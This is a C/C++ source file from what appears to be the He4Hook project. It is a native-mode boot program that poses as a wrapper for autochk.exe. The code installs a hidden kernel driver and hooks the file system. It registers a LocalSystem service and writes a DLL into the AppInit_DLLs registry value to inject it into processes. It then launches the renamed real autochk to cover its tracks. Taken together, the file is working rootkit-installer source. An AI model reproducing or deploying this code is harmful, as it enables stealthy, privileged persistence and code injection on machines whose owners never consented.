#include "ntdll.h"

#include "He4HookBootDriverHide\He4HookBootDriverHide.hpp"
#include "He4NDISBootDriver\He4NDISBootDriver.hpp"
//#define __HE4_BOOT_DEBUG

//#define __HE4_BOOT_INSTALL_NDIS

#define HE4_BOOT_SERVICE_NAME             L"He4HookInv"
#define HE4_BOOT_SERVICE_FILE_NAME        L"System32\\DRIVERS\\He4HookInv.sys" 
#define HE4_BOOT_NDIS_SERVICE_FILE_NAME   L"System32\\DRIVERS\\He4NDIS.sys" 
#define HE4_BOOT_WIN32_SERVICE_NAME       L"He4Win32Srv"
//#define HE4_BOOT_WIN32_SERVICE_FILE_NAME  L"%SystemRoot%\\system32\\He4Win32Srv.exe"
#define HE4_BOOT_WIN32_SERVICE_FILE_NAME  L"System32\\He4Win32Srv.exe"

//\\??\\E:\\WinNT\\

VOID BEDisplayString(PWSTR lpszString);
VOID RtlExitUserProcess(ULONG ExitCode);

void InstallWin32Service(void);
void InstallHookDLL(PWSTR pDLLName, PPEB Peb);
void InstallDevice(void);
BOOLEAN CheckFileExist(PWSTR lpszFileName, BOOLEAN bFullName);
ULONG GetSystemDirectory(PWSTR lpBuffer, ULONG uSize);
void StartRealProcess(PWSTR IntruderProcessName);

HANDLE                  hFileLog = 0;
void OpenLog(void);
void CloseLog(void);
void WriteLog(void* pBuffer, ULONG dwSize);

int w_main(int nArgCount, WCHAR *Arg[], WCHAR *Env[]);

#define HE4_DLL_NAME L"he4r31.dll" //"HookKey.dll"

void mainBootExecute(PPEB Peb)
{
  NTSTATUS       NtStatus;
  int            nReturn = -1;
  PWSTR          pPtr;
  
  PWSTR          pCommandLine = 0;
  ULONG          SizeCommandLine = 0;
  int            nArgCount = 0;
  PWSTR         *Arg = 0;
  ULONG          SizeArg = 0;
  
  PWSTR          pEnvironmentBlock = 0;
  ULONG          SizeEnvironmentBlock = 0;
  int            nEnvCount = 0;
  PWSTR         *Env = 0;
  ULONG          SizeEnv = 0;
 

#ifdef __HE4_BOOT_DEBUG     
  OpenLog();
  BEDisplayString(L"\n\n mainBootExecute(PPEB Peb): Hello!!! This is wrapper to the autochk.exe\n");
#endif //__HE4_BOOT_DEBUG
  
  if(Peb == 0)
    {
#ifdef __HE4_BOOT_DEBUG     
     BEDisplayString(L"\n\n mainBootExecute(PPEB Peb): Peb - ERROR !!!!!!\n");
#endif //__HE4_BOOT_DEBUG
     CloseLog();
     RtlExitUserProcess(nReturn);
    }
  if(Peb->pi == 0)
    {
#ifdef __HE4_BOOT_DEBUG     
     BEDisplayString(L"\n\n mainBootExecute(PPEB Peb): Peb->pi - ERROR !!!!!!\n");
#endif //__HE4_BOOT_DEBUG
     CloseLog();
     RtlExitUserProcess(nReturn);
    }
  
  RtlNormalizeProcessParams(Peb->pi);

//*********************************************************************//
//                      Parse CommandLine                              //
//*********************************************************************//
  pCommandLine = 0;
  SizeCommandLine = Peb->pi->CommandLine.Length + sizeof(WCHAR);
  NtStatus = NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&pCommandLine, 0, &SizeCommandLine, MEM_COMMIT, PAGE_READWRITE);
  if(NT_SUCCESS(NtStatus)) 
    {
#ifdef __HE4_BOOT_DEBUG     
     BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory is OK!!!");
#endif //__HE4_BOOT_DEBUG
     memset(pCommandLine, 0, SizeCommandLine);
     memcpy(pCommandLine, Peb->pi->CommandLine.Buffer, Peb->pi->CommandLine.Length);

     nArgCount = 1;
     SizeArg = sizeof(PWSTR);

     pPtr = pCommandLine;
     while((*pPtr) != UNICODE_NULL)
       {
        pPtr++;
        if((*pPtr) == ((WCHAR)' '))
           nArgCount++;
       }
     SizeArg = nArgCount*sizeof(PWSTR);
     NtStatus = NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&Arg, 0, &SizeArg, MEM_COMMIT, PAGE_READWRITE);
     if(NT_SUCCESS(NtStatus)) 
       {
#ifdef __HE4_BOOT_DEBUG     
        BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for Arg is OK!!!");
#endif //__HE4_BOOT_DEBUG
        memset(Arg, 0, SizeArg);

        pPtr = pCommandLine;
        Arg[0] = pCommandLine;
        nArgCount = 1;
        while((*pPtr) != UNICODE_NULL)
          {
           pPtr++;
           if((*pPtr) == ((WCHAR)' '))
             {
              (*pPtr) = 0;
              Arg[nArgCount] = pPtr+1;
              nArgCount++;
             }
          }
       }
     else
       {
#ifdef __HE4_BOOT_DEBUG     
        BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for Arg is ERROR!!!");
#endif //__HE4_BOOT_DEBUG
        Arg = 0;
        nArgCount = 0;
       }
    }
  else
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory is ERROR!!!");
#endif //__HE4_BOOT_DEBUG
     pCommandLine = 0;
     //RtlExitUserProcess(nReturn);
    }

//*********************************************************************//
//                      Parse EnvironmentBlock                         //
//*********************************************************************//

  pPtr = (PWSTR)Peb->pi->EnvironmentBlock;
  while((*((ULONG*)pPtr)) != 0)
    {
     SizeEnvironmentBlock++;
     pPtr++;
    }
  SizeEnvironmentBlock *= 2;

  NtStatus = NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&pEnvironmentBlock, 0, &SizeEnvironmentBlock, MEM_COMMIT, PAGE_READWRITE);
  if(NT_SUCCESS(NtStatus)) 
    {
#ifdef __HE4_BOOT_DEBUG     
     BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for EnvironmentBlock is OK!!!");
#endif //__HE4_BOOT_DEBUG
     memset(pEnvironmentBlock, 0, SizeEnvironmentBlock);
     memcpy(pEnvironmentBlock, Peb->pi->EnvironmentBlock, SizeEnvironmentBlock);

     nEnvCount = 1;
     SizeEnv = sizeof(PWSTR);

     pPtr = pEnvironmentBlock;
     while((*((ULONG*)pPtr)) != 0)
       {
        pPtr++;
        if((*pPtr) == 0)
           nEnvCount++;
       }
     SizeEnv = (nEnvCount+1)*sizeof(PWSTR);
     
     NtStatus = NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&Env, 0, &SizeEnv, MEM_COMMIT, PAGE_READWRITE);
     if(NT_SUCCESS(NtStatus)) 
       {
#ifdef __HE4_BOOT_DEBUG     
        BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for Env is OK!!!");
#endif //__HE4_BOOT_DEBUG
        memset(Env, 0, SizeEnv);

        pPtr = pEnvironmentBlock;
        Env[0] = pEnvironmentBlock;
        nEnvCount = 1;
        while((*((ULONG*)pPtr)) != 0)
          {
           pPtr++;
           if((*pPtr) == 0)
             {
              (*pPtr) = 0;
              Env[nEnvCount] = pPtr+1;
              nEnvCount++;
             }
          }
       }
     else
       {
#ifdef __HE4_BOOT_DEBUG     
        BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for Env is ERROR!!!");
#endif //__HE4_BOOT_DEBUG
        Env = 0;
        nEnvCount = 0;
       }
    }
  else
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Boot: mainBootExecute(PPEB Peb) - NtAllocateVirtualMemory for EnvironmentBlock is ERROR!!!");
#endif //__HE4_BOOT_DEBUG
     pEnvironmentBlock = 0;
    }

//*********************************************************************//
//                     Call w_main(...)                                //
//*********************************************************************//

  if(nArgCount && Arg && Env)
     nReturn = w_main(nArgCount, Arg, Env);
  else
     nReturn = w_main(0, 0, 0);

//*********************************************************************//
//*********************************************************************//

//__Exit_mainBootExecute:               // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

//*********************************************************************//
//                     Free EnvironmentBlock                           //
//*********************************************************************//
  if(Env && nEnvCount)
    {
     SizeEnv = 0;
     NtStatus = NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&Env, &SizeEnv, MEM_RELEASE);
#ifdef __HE4_BOOT_DEBUG
     if(!NT_SUCCESS(NtStatus)) 
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for Env is ERROR!!!");
       }
     else
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for Env is OK!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

  if(pEnvironmentBlock)
    {
     SizeEnvironmentBlock = 0;
     NtStatus = NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&pEnvironmentBlock, &SizeEnvironmentBlock, MEM_RELEASE);
#ifdef __HE4_BOOT_DEBUG
     if(!NT_SUCCESS(NtStatus)) 
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for EnvironmentBlock is ERROR!!!");
       }
     else
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for EnvironmentBlock is OK!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

//*********************************************************************//
//                         Free CommandLine                            //
//*********************************************************************//
  if(Arg && nArgCount)
    {
     SizeArg = 0;
     NtStatus = NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&Arg, &SizeArg, MEM_RELEASE);
#ifdef __HE4_BOOT_DEBUG
     if(!NT_SUCCESS(NtStatus)) 
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for Arg is ERROR!!!");
       }
     else
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory for Arg is OK!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

  if(pCommandLine)
    {
     SizeCommandLine = 0;
     NtStatus = NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&pCommandLine, &SizeCommandLine, MEM_RELEASE);
#ifdef __HE4_BOOT_DEBUG
     if(!NT_SUCCESS(NtStatus)) 
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory is ERROR!!!");
       }
     else
       {
        BEDisplayString(L"\n He4Hook - NtFreeVirtualMemory is OK!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

  CloseLog();

  RtlExitUserProcess(nReturn);
}

int w_main(int nArgCount, WCHAR *Arg[], WCHAR *Env[])
{
#ifdef __HE4_BOOT_DEBUG
  WCHAR               Buf[255];

  swprintf(Buf, L"\n nArgCount = %u\n", nArgCount);
  BEDisplayString(Buf);

  swprintf(Buf, L"\n Arg = %08X\n", Arg);
  BEDisplayString(Buf);

  swprintf(Buf, L"\n Env = %08X\n", Env);
  BEDisplayString(Buf);

  BEDisplayString(L"\n Arg list:");
  for(int i=0; i<nArgCount; i++)
    {
     BEDisplayString(L"\n      ");
     BEDisplayString(Arg[i]);
    }

  BEDisplayString(L"\n Env list:");
  i = 0;
  if(Env)
    {
     while(Env[i] != 0)
       {
        BEDisplayString(L"\n      ");
        BEDisplayString(Env[i]);
        i++;
       }
    }
  BEDisplayString(L"\n");
#endif //__HE4_BOOT_DEBUG

  InstallDevice();
  InstallWin32Service();

  if(nArgCount > 1)
    {
     if(CheckFileExist(Arg[1], FALSE))
       {
        InstallHookDLL(Arg[1], NtCurrentTeb()->peb);
       }
     else
       {
        InstallHookDLL(HE4_DLL_NAME, NtCurrentTeb()->peb);
       }
    }
  else
    {
     InstallHookDLL(HE4_DLL_NAME, NtCurrentTeb()->peb);
    }

  if(Arg)
     StartRealProcess(Arg[0]);
  
  return 0;
}

void InstallWin32Service(void)
{
  NtBootDriverControlHide *pNtBootDriverControlHide = new NtBootDriverControlHide(HE4_BOOT_WIN32_SERVICE_FILE_NAME);
  if (pNtBootDriverControlHide)
  {
    if (pNtBootDriverControlHide->Result)
    {
      pNtBootDriverControlHide->Install(HE4_BOOT_WIN32_SERVICE_NAME, 0x110, 2, 1, L"LocalSystem");
    }

    delete pNtBootDriverControlHide;
  }
}

void InstallDevice(void)
{
  He4HookBootDriverHide *lpHe4HookBootDriverHide = new He4HookBootDriverHide(HE4_BOOT_SERVICE_FILE_NAME);
  if(lpHe4HookBootDriverHide)
    {
     if(lpHe4HookBootDriverHide->Result)
       {
        lpHe4HookBootDriverHide->Install();
        #ifndef __HE4_BOOT_DEBUG
        lpHe4HookBootDriverHide->HookFileSystem(2);
        #else
        if (lpHe4HookBootDriverHide->HookFileSystem(2) == FALSE)
          BEDisplayString(L"\n lpHe4HookBootDriverHide->HookFileSystem(2) = FALSE !!!");
        else
          BEDisplayString(L"\n lpHe4HookBootDriverHide->HookFileSystem(2) = TRUE !!!");
        #endif //__HE4_BOOT_DEBUG
       }
     delete(lpHe4HookBootDriverHide);
    }
#ifdef __HE4_BOOT_DEBUG
  else
    {
     BEDisplayString(L"\n Class He4HookBootDriverHide don`t created !!!");
    }
#endif //__HE4_BOOT_DEBUG
  
#ifdef __HE4_BOOT_INSTALL_NDIS
  He4NDISBootDriver *lpHe4NDISBootDriver = new He4NDISBootDriver(HE4_BOOT_NDIS_SERVICE_FILE_NAME);
  if(lpHe4NDISBootDriver)
    {
     if(lpHe4NDISBootDriver->Result)
       {
        lpHe4NDISBootDriver->Install();
       }
     delete(lpHe4NDISBootDriver);
    }
#ifdef __HE4_BOOT_DEBUG
  else
    {
     BEDisplayString(L"\n Class He4NDISBootDriver don`t created !!!");
    }
#endif //__HE4_BOOT_DEBUG
#endif //__HE4_BOOT_INSTALL_NDIS
}

void InstallHookDLL(PWSTR pDLLName, PPEB Peb)
{
  UNICODE_STRING     str, GroupValue, KeyFile, UniWinDir;
  NTSTATUS           NtStatus;
  HANDLE             hKey/*, hKeyLoad*/;
  OBJECT_ATTRIBUTES  obj, KeyObj;
  ULONG              Disposition/*, dwData*/;
  BOOLEAN            bEnable;
  WCHAR              DosPathToKeyFile[512] = L"c:\\winnt\\system32\\config\\software";
  WCHAR              WinDir[512];


  if(!pDLLName)
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Hook key Dll name is NULL !!!");
#endif //__HE4_BOOT_DEBUG
     return;
    }
#ifdef __HE4_BOOT_DEBUG
  else
    {
     BEDisplayString(L"\n He4Hook key Dll name is ");
     BEDisplayString(pDLLName);
     BEDisplayString(L"   !!!");
    }
#endif //__HE4_BOOT_DEBUG

  if(Peb)
    {
     RtlInitUnicodeString(&str, L"windir");
     //RtlInitUnicodeString(&UniWinDir, L"                                                                                ");
     UniWinDir.Buffer = WinDir;
     UniWinDir.Length  = 0;
     UniWinDir.MaximumLength = sizeof(WinDir);
  
     if(Peb->pi->EnvironmentBlock)
       {
        NtStatus = RtlQueryEnvironmentVariable_U(Peb->pi->EnvironmentBlock, &str, &UniWinDir);
#ifdef __HE4_BOOT_DEBUG
        if(!NT_SUCCESS(NtStatus)) 
          {
           BEDisplayString(L"\n He4Hook - WINDIR not found into EnvironmentBlock!!!");
          }
        else
          {
           BEDisplayString(L"\n ");
           NtDisplayString(&UniWinDir);
           memset(DosPathToKeyFile, 0, sizeof(DosPathToKeyFile));
           memcpy(DosPathToKeyFile, UniWinDir.Buffer, UniWinDir.Length);
           memcpy(((CHAR*)DosPathToKeyFile)+UniWinDir.Length, L"\\system32\\config\\software", sizeof(L"\\system32\\config\\software"));
           BEDisplayString(L"\n ");
           BEDisplayString(DosPathToKeyFile);
          }
#else
        if(NT_SUCCESS(NtStatus)) 
          {
           memset(DosPathToKeyFile, 0, sizeof(DosPathToKeyFile));
           memcpy(DosPathToKeyFile, UniWinDir.Buffer, UniWinDir.Length);
           memcpy(((CHAR*)DosPathToKeyFile)+UniWinDir.Length, L"\\system32\\config\\software", sizeof(L"\\system32\\config\\software"));
          }
#endif //__HE4_BOOT_DEBUG
       }
#ifdef __HE4_BOOT_DEBUG
     else
       {
        BEDisplayString(L"\n He4Hook - EnvironmentBlock is NULL!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

  RtlInitUnicodeString(&str, L"\\Registry\\Machine");
  InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
  NtStatus = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obj);
  if(!NT_SUCCESS(NtStatus)) 
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Hook key \\Registry\\Machine for DLL don`t opened !!!");
#endif //__HE4_BOOT_DEBUG
     return;
    }
  RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bEnable);
  RtlDosPathNameToNtPathName_U(DosPathToKeyFile, &KeyFile, NULL, NULL);
  InitializeObjectAttributes(&obj, &KeyFile, OBJ_CASE_INSENSITIVE, NULL, NULL);

  RtlInitUnicodeString(&str, L"SOFTWARE");
  InitializeObjectAttributes(&KeyObj, &str, OBJ_CASE_INSENSITIVE, hKey, NULL);

  NtStatus = NtLoadKey(&KeyObj, &obj);
  if(!NT_SUCCESS(NtStatus)) 
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Hook key \\Registry\\Machine\\SOFTWARE for DLL don`t loaded !!!");
#endif //__HE4_BOOT_DEBUG
     NtClose(hKey);
     return;
    }
  NtClose(hKey);
#ifdef __HE4_BOOT_DEBUG
  BEDisplayString(L"\n He4Hook key \\Registry\\Machine\\SOFTWARE for DLL loaded OK!!!");
#endif //__HE4_BOOT_DEBUG
/************************************************************************/
  RtlInitUnicodeString(&str, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows");
  InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
  NtStatus = NtCreateKey(&hKey, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_VOLATILE, &Disposition);
  if(!NT_SUCCESS(NtStatus)) 
    {
#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n He4Hook key for DLL don`t created !!!");
#endif //__HE4_BOOT_DEBUG
     return;
    }
#ifdef __HE4_BOOT_DEBUG
  else
    {
     BEDisplayString(L"\n He4Hook key for DLL created !!!");
    }
#endif //__HE4_BOOT_DEBUG

  RtlInitUnicodeString(&str, L"AppInit_DLLs");
  RtlInitUnicodeString(&GroupValue, pDLLName);//L"HookKey.dll");
  NtStatus = NtSetValueKey(hKey, &str, 0, REG_SZ, GroupValue.Buffer, GroupValue.Length+sizeof(WCHAR));
#ifdef __HE4_BOOT_DEBUG
  if(!NT_SUCCESS(NtStatus)) 
    {
     BEDisplayString(L"\n He4Hook - \"AppInit_DLLs: HookKey.dll\" set value ERROR!!!");
    }
  else
    {
     BEDisplayString(L"\n He4Hook - \"AppInit_DLLs: HookKey.dll\" set value OK!!!");
    }
#endif //__HE4_BOOT_DEBUG

  NtClose(hKey);

  RtlInitUnicodeString(&str, L"\\Registry\\Machine");
  InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
  NtStatus = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obj);
  if(!NT_SUCCESS(NtStatus)) 
    {
     return;
    }

  RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bEnable);
  RtlInitUnicodeString(&str, L"SOFTWARE");
  InitializeObjectAttributes(&KeyObj, &str, OBJ_CASE_INSENSITIVE, hKey, NULL);

  NtStatus = NtUnloadKey(&KeyObj);
#ifdef __HE4_BOOT_DEBUG
  if(!NT_SUCCESS(NtStatus)) 
    {
     BEDisplayString(L"\n He4Hook - NtUnloadKey ERROR!!!");
    }
  else
    {
     BEDisplayString(L"\n He4Hook - NtUnloadKey OK!!!");
    }
#endif //__HE4_BOOT_DEBUG

  NtClose(hKey);

}

VOID BEDisplayString(PWSTR lpszString)
{
  UNICODE_STRING     str;
  
  if(lpszString)
    {
     RtlInitUnicodeString(&str, lpszString);
     NtDisplayString(&str);

     WriteLog(lpszString, 2*(wcslen(lpszString)+1));
    }
}

VOID RtlExitUserProcess(ULONG ExitCode)
{
  RtlAcquirePebLock();
  NtTerminateProcess(0, ExitCode);
  LdrShutdownProcess();
  NtTerminateProcess((HANDLE)0xffffffff/*NtCurrentProcess()*/, ExitCode);
#ifdef __HE4_BOOT_DEBUG
  BEDisplayString(L"\n RtlExitUserProcess ERROR");
#endif //__HE4_BOOT_DEBUG
  RtlReleasePebLock();
}

BOOLEAN CheckFileExist(PWSTR lpszFileName, BOOLEAN bFullName)
{
  WCHAR                   FullFileName[512] = {0};
  UNICODE_STRING          FileNameUnicodeString;
  OBJECT_ATTRIBUTES       objectAttributes;
  IO_STATUS_BLOCK         ioStatus;
  NTSTATUS                ntStatus;
  HANDLE                  hFile;
  BOOLEAN                 bRet = FALSE;
  ULONG                   SizeFileName = 0, WinDir = 0;

  while(lpszFileName[SizeFileName] != UNICODE_NULL)
     SizeFileName++;
  SizeFileName = SizeFileName*2;

  if(bFullName)
    {
     memcpy(FullFileName, lpszFileName, SizeFileName+sizeof(WCHAR));
    }
  else
    {
     if((WinDir = GetSystemDirectory(FullFileName, sizeof(FullFileName))))
       {
        memcpy(((CHAR*)FullFileName+WinDir), L"\\", sizeof(L"\\"));
        memcpy(((CHAR*)FullFileName+WinDir+sizeof(WCHAR)), lpszFileName, SizeFileName+sizeof(WCHAR));
#ifdef __HE4_BOOT_DEBUG
        BEDisplayString(L"\n\n WindowsDirectory: \n");
        BEDisplayString(FullFileName);
        BEDisplayString(L"\n\n");
#endif //__HE4_BOOT_DEBUG
       }
     else
       {
        memcpy(FullFileName, lpszFileName, SizeFileName+sizeof(WCHAR));
       }
    }

  //RtlInitUnicodeString(&FileNameUnicodeString, FullFileName);
  RtlDosPathNameToNtPathName_U(FullFileName, &FileNameUnicodeString, NULL, NULL);
#ifdef __HE4_BOOT_DEBUG
        BEDisplayString(L" WindowsDirectoryUNI: \n");
        NtDisplayString(&FileNameUnicodeString);
        BEDisplayString(L"\n\n");
#endif //__HE4_BOOT_DEBUG
  InitializeObjectAttributes(&objectAttributes, &FileNameUnicodeString,
                             OBJ_CASE_INSENSITIVE, NULL, NULL);

  ntStatus = NtCreateFile(&hFile, FILE_READ_DATA,
                          &objectAttributes, &ioStatus, NULL, 
                          FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
                          FILE_OPEN, 0, NULL, 0);
  if(NT_SUCCESS(ntStatus)) 
    {
     bRet = TRUE;
     NtClose(hFile);
    }
  return bRet;
}

void OpenLog(void)
{
  UNICODE_STRING          FileNameUnicodeString;
  OBJECT_ATTRIBUTES       objectAttributes;
  IO_STATUS_BLOCK         ioStatus;
  
  if (hFileLog != 0)
    return;

  RtlDosPathNameToNtPathName_U(L"He4Boot.log", &FileNameUnicodeString, NULL, NULL);
  InitializeObjectAttributes(&objectAttributes, &FileNameUnicodeString,
                             OBJ_CASE_INSENSITIVE, NULL, NULL);

  NtCreateFile(&hFileLog, FILE_WRITE_DATA | SYNCHRONIZE,
               &objectAttributes, &ioStatus, NULL, 
               FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
               FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
}

void CloseLog(void)
{
  if (hFileLog != 0)
    NtClose(hFileLog);
  hFileLog = 0;
}

void WriteLog(void* pBuffer, ULONG dwSize)
{
  IO_STATUS_BLOCK         ioStatus;
  NtWriteFile(hFileLog, 0, 0, 0, &ioStatus, pBuffer, dwSize, 0, 0);
}

ULONG GetSystemDirectory(PWSTR lpBuffer, ULONG uSize)
{
  PPEB             Peb = NtCurrentTeb()->peb;
  UNICODE_STRING   str, UniWinDir;
  ULONG            Ret = 0, SizeCopy;
  NTSTATUS         NtStatus;
  WCHAR            WinDir[512];

  if(!lpBuffer || ! uSize) return Ret;
  if(Peb)
    {
     RtlInitUnicodeString(&str, L"windir");
     //RtlInitUnicodeString(&UniWinDir, L"                                                                                ");
     UniWinDir.Buffer = WinDir;
     UniWinDir.Length  = 0;
     UniWinDir.MaximumLength = sizeof(WinDir);
  
     if(Peb->pi->EnvironmentBlock)
       {
        NtStatus = RtlQueryEnvironmentVariable_U(Peb->pi->EnvironmentBlock, &str, &UniWinDir);
        if(NT_SUCCESS(NtStatus)) 
          {
           memset(lpBuffer, 0, uSize);
           SizeCopy = UniWinDir.Length;
           if(SizeCopy >= uSize)
              SizeCopy = uSize - sizeof(WCHAR);
           memcpy(lpBuffer, UniWinDir.Buffer, SizeCopy);
           if((uSize-SizeCopy) > 2)
              memcpy(((CHAR*)lpBuffer)+SizeCopy, L"\\system32", sizeof(L"\\system32") < (uSize-SizeCopy) ? sizeof(L"\\system32") : ((uSize-SizeCopy) - sizeof(WCHAR)));
          }
       }
#ifdef __HE4_BOOT_DEBUG
     else
       {
        BEDisplayString(L"\n He4Hook - EnvironmentBlock is NULL!!!");
       }
#endif //__HE4_BOOT_DEBUG
    }

  Ret = 0;
  while(lpBuffer[Ret] != UNICODE_NULL)
     Ret++;
  return 2*Ret;
}

void StartRealProcess(PWSTR IntruderProcessName)
{
  if(!IntruderProcessName) return;

  PPEB                 Peb = NtCurrentTeb()->peb;
  NTSTATUS             NtStatus;
  PWSTR                pCommandLine = 0, pPtrName;
  ULONG                SizeCommandLine = 0;
  PPROCESS_PARAMETRS   pProcessParam = 0;
  RTL_PROCESS_INFORMATION pi;
  UNICODE_STRING       UniDOSProcName, UniProcName, UniRealCommandLine;
  BOOLEAN              bEnable;

  RtlNormalizeProcessParams(Peb->pi);

  pPtrName = IntruderProcessName + wcslen(IntruderProcessName);

  while(*pPtrName != L'\\' && pPtrName != IntruderProcessName)
     pPtrName--;
  if(pPtrName != IntruderProcessName)
     pPtrName++;

  RtlAdjustPrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, TRUE, FALSE, &bEnable);

  pCommandLine = 0;
  SizeCommandLine = Peb->pi->CommandLine.Length + sizeof(WCHAR);
  NtStatus = NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&pCommandLine, 0, &SizeCommandLine, MEM_COMMIT, PAGE_READWRITE);
  if(NT_SUCCESS(NtStatus)) 
    {
     memset(pCommandLine, 0, SizeCommandLine);
     memcpy(pCommandLine, Peb->pi->CommandLine.Buffer, Peb->pi->CommandLine.Length);

     //memcpy(&pCommandLine[wcslen(IntruderProcessName)-5], L"_", 2*wcslen(L"_"));
     memcpy(&pCommandLine[wcslen(IntruderProcessName)-3], L"ext", 2*wcslen(L"ext"));
     //wcscpy(&pCommandLine[(ULONG)(pPtrName-IntruderProcessName)], L"child.exe");
     RtlInitUnicodeString(&UniRealCommandLine, pCommandLine);

     RtlInitUnicodeString(&UniDOSProcName, pPtrName); //L"child.exe"
     //memcpy(&UniDOSProcName.Buffer[wcslen(IntruderProcessName)-5], L"_", 2*wcslen(L"_"));
     memcpy(&UniDOSProcName.Buffer[wcslen(pPtrName)-3], L"ext", 2*wcslen(L"ext"));

     RtlDosPathNameToNtPathName_U(UniDOSProcName.Buffer, &UniProcName, NULL, NULL);

#ifdef __HE4_BOOT_DEBUG
     BEDisplayString(L"\n Real DOS process name:\n     ");
     BEDisplayString(UniDOSProcName.Buffer);

     BEDisplayString(L"\n Real process name:\n     ");
     BEDisplayString(UniProcName.Buffer);

     BEDisplayString(L"\n Real command line:\n     ");
     BEDisplayString(pCommandLine);
#endif //__HE4_BOOT_DEBUG

     RtlCreateProcessParameters(&pProcessParam, &UniProcName, NULL, NULL,
                                &UniRealCommandLine, NULL, NULL, NULL, NULL, NULL);

     NtStatus = RtlCreateUserProcess(&UniProcName, OBJ_CASE_INSENSITIVE, pProcessParam,
                                     NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
     if(NT_SUCCESS(NtStatus))
       {
#ifdef __HE4_BOOT_DEBUG
        BEDisplayString(L"\n RtlCreateUserProcess: OK!!!\n     ");
#endif //__HE4_BOOT_DEBUG
        NtResumeThread(pi.ThreadHandle, NULL);
        NtWaitForSingleObject(pi.ProcessHandle, FALSE, NULL);
       }
#ifdef __HE4_BOOT_DEBUG
     else
       {
        WCHAR               Buf[255];
        BEDisplayString(L"\n RtlCreateUserProcess: ERROR!!!     ");
        swprintf(Buf, L" NtStatus = %08X\n", NtStatus);
        BEDisplayString(Buf);
       }
#endif //__HE4_BOOT_DEBUG

     SizeCommandLine = 0;
     NtStatus = NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&pCommandLine, &SizeCommandLine, MEM_RELEASE);
    }
}